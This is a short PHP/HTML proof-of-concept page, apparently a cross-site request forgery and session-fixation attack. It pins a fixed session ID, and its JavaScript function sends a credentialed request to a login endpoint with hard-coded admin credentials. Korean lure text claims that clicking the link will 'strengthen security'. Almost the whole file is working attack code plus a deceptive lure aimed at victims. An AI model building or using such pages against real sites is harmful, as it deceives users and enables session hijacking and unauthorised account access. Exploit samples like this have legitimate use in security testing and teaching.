<?php
    session_id('t4q9rasetoqbmu6fq6819fcsd3');    
    session_start();
?>
<html>
    <meta charset="UTF-8">
<head>
</head>

<script>

    function poc() {
        var host='localhost';
        var req_uri = "http://" + host + "/login_ok.php?userid=admin&userpw=admin"
        var xmlhttp = new XMLHttpRequest();

        xmlhttp.open("GET",req_uri,true);
        xmlhttp.withCredentials = "true";

        xmlhttp.send();
        alert('Done!');
    }
</script>

<body>
    이 링크를 누르시면 보안이 강화됩니다!!<br />
    <a href="javascript:poc()">Click!</a><br />
</body>
</html>